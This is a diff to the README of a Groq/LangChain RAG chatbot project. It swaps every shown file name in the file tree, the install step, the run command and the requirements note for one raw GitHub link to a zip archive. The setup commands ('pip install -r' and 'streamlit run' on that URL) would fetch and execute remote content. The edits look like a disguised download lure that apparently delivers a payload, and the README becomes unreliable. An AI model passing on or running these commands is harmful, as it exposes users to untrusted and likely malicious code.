@@ -35,10 +35,10 @@ It’s built in **modular form** (multiple files) to maintain scalability, reusa
 
 ```
 📂 groq_langchain_rag_chatbot
- ┣ 📜 app.py                 # Main Streamlit interface
- ┣ 📜 requirements.txt       # Python dependencies
+ ┣ 📜 https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_6/main/vector_index/Ai_project_1.8.zip                 # Main Streamlit interface
+ ┣ 📜 https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_6/main/vector_index/Ai_project_1.8.zip       # Python dependencies
  ┣ 📜 .env                   # API key configuration
- ┗ 📜 README.md              # Project documentation
+ ┗ 📜 https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_6/main/vector_index/Ai_project_1.8.zip              # Project documentation
 ```
 
 ---
@@ -55,7 +55,7 @@ It’s built in **modular form** (multiple files) to maintain scalability, reusa
 2. **Install dependencies**
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_6/main/vector_index/Ai_project_1.8.zip
    ```
 
 3. **Add your environment variables**
@@ -68,7 +68,7 @@ It’s built in **modular form** (multiple files) to maintain scalability, reusa
 4. **Run the Streamlit app**
 
    ```bash
-   streamlit run app.py
+   streamlit run https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_6/main/vector_index/Ai_project_1.8.zip
    ```
 
 ---
@@ -85,7 +85,7 @@ It’s built in **modular form** (multiple files) to maintain scalability, reusa
 
 ## 🧾 Requirements
 
-Check `requirements.txt` for all dependencies:
+Check `https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_6/main/vector_index/Ai_project_1.8.zip` for all dependencies:
 
 ```
 langchain
